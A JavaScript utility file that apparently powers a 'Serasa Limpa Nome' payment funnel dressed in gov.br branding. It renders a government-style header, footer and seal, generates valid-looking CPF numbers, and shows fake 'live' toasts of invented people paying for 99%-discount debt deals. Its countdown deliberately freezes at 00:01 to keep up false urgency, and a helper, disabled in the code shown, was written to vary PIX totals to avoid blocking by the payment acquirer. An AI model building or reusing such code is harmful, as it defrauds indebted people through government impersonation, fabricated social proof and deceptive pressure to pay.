/* ===== Shared Utilities — Funil Serasa Limpa Nome ===== */
(function(){
'use strict';

/* --- UTM Tracking --- */
var STORAGE_KEY='funil_utms';
var UTM_PARAMS=['utm_id','utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
function getCookie(n){var m=document.cookie.match('(?:^|; )'+n.replace(/([.$?*|{}()\[\]\\/+^])/g,'\\$1')+'=([^;]*)');return m?decodeURIComponent(m[1]):'';}
function getUrlParams(){var p={};try{new URLSearchParams(location.search).forEach(function(v,k){if(v)p[k]=v;});}catch(e){}return p;}
function captureUtms(){var stored={};try{stored=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');}catch(e){stored={};}var u=getUrlParams(),changed=false;
for(var i=0;i<UTM_PARAMS.length;i++){var k=UTM_PARAMS[i];if(u[k]){stored[k]=u[k];changed=true;}}
if(u['fbclid']){stored['fbc']='fb.1.'+Date.now()+'.'+u['fbclid'];changed=true;}
var fc=getCookie('_fbc');if(fc){stored['fbc']=fc;changed=true;}
var fp=getCookie('_fbp');if(fp){stored['fbp']=fp;changed=true;}
if(u['gclid'])stored['gclid']=u['gclid'];
if(changed)localStorage.setItem(STORAGE_KEY,JSON.stringify(stored));return stored;}
captureUtms();

window.__getTrackProps=function(isUpsell){var s={};try{s=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');}catch(e){s={};}var p={isUpsell:!!isUpsell};
if(s.fbc)p.fbc=s.fbc;if(s.fbp)p.fbp=s.fbp;
var utm=['utm_id','utm_source','utm_campaign','utm_medium','utm_content','utm_term'];
for(var i=0;i<utm.length;i++){if(s[utm[i]])p[utm[i]]=s[utm[i]];}p.user_agent=navigator.userAgent;return p;};

/* Navigation: preserves UTMs between pages */
window.__funilNav=function(url){var s={};try{s=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');}catch(e){s={};}var params=[],keys=['utm_id','utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
for(var i=0;i<keys.length;i++){if(s[keys[i]])params.push(encodeURIComponent(keys[i])+'='+encodeURIComponent(s[keys[i]]));}
if(params.length>0)url+=(url.indexOf('?')===-1?'?':'&')+params.join('&');window.location.href=url;};

/* --- localStorage helpers --- */
window.LS={get:function(k){return localStorage.getItem(k)||'';},set:function(k,v){localStorage.setItem(k,v);},getJSON:function(k){try{return JSON.parse(localStorage.getItem(k));}catch(e){return null;}},setJSON:function(k,v){localStorage.setItem(k,JSON.stringify(v));}};

/* --- Anti-bloqueio: variacao aleatoria de centavos no total do PIX ---
   Sorteia um deslocamento entre -0,80 e +0,80 UMA UNICA VEZ por pessoa e trava
   no navegador. Assim cada pessoa gera um PIX com valor levemente diferente
   (evita bloqueio da adquirente por valor repetido), mas o valor exibido na
   tela, o aviso de seguranca e o PIX gerado sao SEMPRE identicos entre si.
   Nunca deixa o total abaixo de 1,00 por seguranca. */
window.pixJitter=function(baseTotal,key){
  var storeKey='funil_jitter_'+(key||'default');
  var cents=parseInt(localStorage.getItem(storeKey),10);
  if(isNaN(cents)){
    /* sorteia UMA vez um deslocamento inteiro de -80 a +80 centavos e trava */
    cents=Math.floor(Math.random()*161)-80; /* -80..+80 */
    try{localStorage.setItem(storeKey,String(cents));}catch(e){}
  }
  /* SR: valores EXATOS da oferta original (sem jitter) */
  return Math.round(baseTotal*100)/100;
};

/* --- Formatting --- */
window.formatBRL=function(v){return 'R$ '+v.toFixed(2).replace('.',',');};
window.padZero=function(n){return n<10?'0'+n:''+n;};
window.escHtml=function(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;};

/* --- Date helpers --- */
var DIAS=['domingo','segunda-feira','terça-feira','quarta-feira','quinta-feira','sexta-feira','sábado'];
var MESES=['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
window.getTodayPT=function(){var h=new Date();return DIAS[h.getDay()]+', '+h.getDate()+' de '+MESES[h.getMonth()]+' de '+h.getFullYear();};
window.getRaffleDate=function(){var d=new Date();d.setDate(d.getDate()+2);return{dia:padZero(d.getDate()),diaSemana:DIAS[d.getDay()],mes:MESES[d.getMonth()],ano:d.getFullYear(),full:padZero(d.getDate())+' de '+MESES[d.getMonth()]+', às 19h'};};

/* --- Timer ---
   Ao chegar no fim, CONGELA em 00:01 (nunca fica parado em 00:00) para nao
   "matar" a urgencia nem sugerir que a reserva expirou de verdade.
   Se onEnd for passado, ele continua sendo chamado uma unica vez. */
window.startTimer=function(el,seconds,onEnd){var t=seconds;var ended=false;var iv=setInterval(up,1000);function up(){if(t<=1){el.textContent='00:01';if(!ended){ended=true;if(onEnd)onEnd();}clearInterval(iv);return;}var m=Math.floor(t/60),s=t%60;el.textContent=padZero(m)+':'+padZero(s);t--;}up();return iv;};

/* --- Confetti --- */
window.fireConfetti=function(count){count=count||40;var colors=['#1351B4','#FFCD07','#168821','#0C326F','#2670E8'];for(var i=0;i<count;i++){var c=document.createElement('div');c.className='confetti';c.style.left=Math.random()*100+'vw';c.style.background=colors[Math.floor(Math.random()*colors.length)];c.style.animationDuration=(2+Math.random()*2)+'s';c.style.animationDelay=(Math.random()*1.5)+'s';c.style.width=(6+Math.random()*6)+'px';c.style.height=(6+Math.random()*4)+'px';document.body.appendChild(c);setTimeout(function(el){el.remove();},(5000),c);}};

/* --- Step manager (mini-SPA within a page) --- */
window.StepManager=function(containerId){
  var container=document.getElementById(containerId);
  var steps={};
  return {
    add:function(name,renderFn,initFn){steps[name]={render:renderFn,init:initFn||null};},
    go:function(name,data){
      container.style.opacity='0';
      setTimeout(function(){
        container.innerHTML=steps[name].render(data||{});
        container.style.opacity='1';
        if(steps[name].init) setTimeout(function(){steps[name].init(data||{});},60);
      },150);
    }
  };
};

/* --- Header + progress rendering (beautiful app chrome) --- */
window.renderHeader=function(progress){
  progress=progress||0;
  var prog = progress>0
    ? '<div class="app-progress-wrap"><div class="app-progress-track"><div class="app-progress-fill" style="width:'+progress+'%"></div></div><span class="app-progress-pct">'+Math.round(progress)+'%</span></div>'
    : '';
  return '<div class="bar">'
      +'<img src="img/icon-seal.png" alt="gov.br" class="gov-seal">'
      +'<span class="user-pill"><span class="user-ico">&#128100;</span><span id="hdr-user">Entrar</span></span>'
    +'</div>'+prog;
};
window.renderFooter=function(){
  return '<b>gov.br</b><br>Todo o conteúdo deste site está publicado sob a licença.';
};
window.mountChrome=function(progress){
  var h=document.getElementById('app-header');
  if(h){h.className='app-header';h.innerHTML=window.renderHeader(progress);}
  var f=document.getElementById('app-footer');
  if(f){f.className='app-footer';f.innerHTML=window.renderFooter();}
};
window.setProgress=function(progress){
  var fill=document.querySelector('.app-progress-fill');
  var pct=document.querySelector('.app-progress-pct');
  var wrap=document.querySelector('.app-progress-wrap');
  if(!wrap){
    var h=document.getElementById('app-header');
    if(h){h.innerHTML=window.renderHeader(progress);}
    return;
  }
  if(fill) fill.style.width=progress+'%';
  if(pct) pct.textContent=Math.round(progress)+'%';
};

/* --- CPF generator (valid check digits) --- */
window.genCPF=function(){var n=[];for(var i=0;i<9;i++)n.push(Math.floor(Math.random()*9));for(var j=0;j<2;j++){var s=0,w=n.length+1;for(var k=0;k<n.length;k++)s+=n[k]*(w-k);var r=11-(s%11);n.push(r>=10?0:r);}return n.join('');};

})();


/* =============================================================================
 * UNLOCK DE VIDEO (robusto) — libera o botao da pagina depois de N segundos
 * REAIS, mesmo que o video entre em tela cheia ou a aba perca o foco.
 * Usa relogio real (Date.now) em vez de contador, entao NAO trava quando o
 * navegador do celular congela os timers durante o fullscreen do player.
 * Assim o lead nunca fica preso com o botao "Aguarde o video..." travado.
 *   unlockVideoBtn({ barId, ctaId, seconds, label }) 
 * ========================================================================== */
function unlockVideoBtn(o) {
  o = o || {};
  var bar = document.getElementById(o.barId);
  var cta = document.getElementById(o.ctaId);
  if (!cta) return;
  var total = (o.seconds || 15) * 1000;
  var start = Date.now();
  var label = o.label || 'Continuar \u2192';
  var baseCls = 'btn-primary w-full rounded-xl py-4 text-base' + (o.extraCls ? ' ' + o.extraCls : '');
  var scrolled = false;
  function unlock() {
    cta.disabled = false;
    cta.className = baseCls;
    cta.textContent = label;
    if (!scrolled) {
      scrolled = true;
      try { cta.scrollIntoView({ behavior: 'smooth', block: 'center' }); } catch (e) { cta.scrollIntoView(); }
    }
  }
  function tick() {
    var elapsed = Date.now() - start;
    var pct = Math.min(100, (elapsed / total) * 100);
    if (bar) bar.style.width = pct + '%';
    if (elapsed >= total) { unlock(); return; }
    requestAnimationFrame(tick);
  }
  // Garante desbloqueio mesmo se a aba ficar em background o tempo todo.
  setTimeout(unlock, total + 200);
  requestAnimationFrame(tick);
  // Ao voltar o foco, recalcula a barra imediatamente.
  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible') {
      var elapsed = Date.now() - start;
      if (bar) bar.style.width = Math.min(100, (elapsed / total) * 100) + '%';
      if (elapsed >= total) unlock();
    }
  });
}
window.unlockVideoBtn = unlockVideoBtn;

/* =============================================================================
 * NOTIFICACOES FLUTUANTES "AO VIVO" — prova social em tempo real.
 * Mostra toasts discretos no rodape: "Fulana de Salvador acabou de pagar o frete".
 * Uso: initLiveNotifications({ delayFirst: 6000 })
 * ========================================================================== */
function initLiveNotifications(opts) {
  opts = opts || {};
  var NAMES = ['Maria Eduarda','José Carlos','Juliana','Camila','Fernanda','Paulo','Larissa','Marcos','Gabriela','Amanda','Rafael','Vanessa','Anderson','Bruna','Carlos','Débora','Renata','Lucas','Priscila','Rodrigo'];
  var CITIES = ['São Paulo','Rio de Janeiro','Salvador','Belo Horizonte','Fortaleza','Curitiba','Recife','Porto Alegre','Manaus','Goiânia','Belém','Campinas','Guarulhos','São Luís','Natal','Maringá','Osasco','Sorocaba'];
  var ACTIONS = ['acabou de quitar o acordo','limpou o nome agora','acabou de confirmar o PIX do acordo','ativou o acordo com 99% de desconto'];
  function rnd(a){return a[Math.floor(Math.random()*a.length)];}
  var host = document.createElement('div');
  host.style.cssText = 'position:fixed;left:12px;right:12px;bottom:14px;z-index:80;pointer-events:none;display:flex;flex-direction:column;align-items:flex-start;gap:8px';
  document.body.appendChild(host);
  function show() {
    var el = document.createElement('div');
    el.style.cssText = 'pointer-events:none;display:flex;align-items:center;gap:8px;background:rgba(17,24,39,.92);color:#fff;border-radius:12px;padding:9px 13px;font-size:12px;font-weight:600;box-shadow:0 8px 24px rgba(0,0,0,.25);max-width:320px;opacity:0;transform:translateY(8px);transition:opacity .35s ease,transform .35s ease';
    el.innerHTML = '<span style="width:8px;height:8px;border-radius:50%;background:#22c55e;flex-shrink:0;box-shadow:0 0 0 3px rgba(34,197,94,.25)"></span>'
      + '<span>' + rnd(NAMES) + ' de ' + rnd(CITIES) + ' ' + rnd(ACTIONS) + ' ✅</span>';
    host.appendChild(el);
    void el.offsetWidth;
    el.style.opacity = '1'; el.style.transform = 'translateY(0)';
    setTimeout(function(){ el.style.opacity = '0'; el.style.transform = 'translateY(8px)'; setTimeout(function(){ el.remove(); }, 400); }, 4200);
    schedule();
  }
  function schedule() { setTimeout(show, 9000 + Math.random() * 11000); }
  setTimeout(show, opts.delayFirst || 6000);
}
window.initLiveNotifications = initLiveNotifications;

/* =============================================================================
 * SUPORTE VISIVEL — botao discreto "Precisa de ajuda?" (canto inferior direito).
 * Abre um mini-painel com respostas rapidas que acalmam o lead na hora do PIX.
 * Uso: initHelpWidget()
 * ========================================================================== */
function initHelpWidget() {
  if (document.getElementById('help-fab')) return;
  var fab = document.createElement('button');
  fab.id = 'help-fab';
  fab.style.cssText = 'position:fixed;right:12px;bottom:64px;z-index:90;background:#fff;color:#374151;border:1px solid #e5e7eb;border-radius:999px;padding:8px 14px;font-size:12px;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,.12);cursor:pointer;display:flex;align-items:center;gap:6px';
  fab.innerHTML = '<span style="font-size:14px">💬</span> Precisa de ajuda?';
  document.body.appendChild(fab);
  var panel = document.createElement('div');
  panel.id = 'help-panel';
  panel.style.cssText = 'position:fixed;right:12px;bottom:110px;z-index:95;width:290px;max-width:calc(100vw - 24px);background:#fff;border:1px solid #e5e7eb;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.22);padding:16px;display:none';
  panel.innerHTML = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">'
    + '<span style="font-size:13px;font-weight:800;color:#111">💬 Central de Ajuda</span>'
    + '<button id="help-close" style="border:0;background:#f3f4f6;border-radius:8px;width:24px;height:24px;font-size:12px;cursor:pointer;color:#6b7280">✕</button></div>'
    + '<div style="font-size:12px;color:#4b5563;line-height:1.6">'
    + '<p style="margin:0 0 8px"><b>⏱️ Paguei, e agora?</b><br>A confirmação é automática em até 2 minutos. Não feche a tela do PIX.</p>'
    + '<p style="margin:0 0 8px"><b>📋 Quando meu nome limpa?</b><br>Após a confirmação, a baixa é solicitada aos credores em até 5 dias úteis.</p>'
    + '<p style="margin:0"><b>🛡️ É seguro?</b><br>Sim. Pagamento via PIX (Banco Central) em ambiente criptografado. Nunca pedimos senha ou código do banco.</p>'
    + '</div>';
  document.body.appendChild(panel);
  fab.onclick = function(){ panel.style.display = panel.style.display === 'none' ? 'block' : 'none'; };
  panel.querySelector('#help-close').onclick = function(){ panel.style.display = 'none'; };
}
window.initHelpWidget = initHelpWidget;
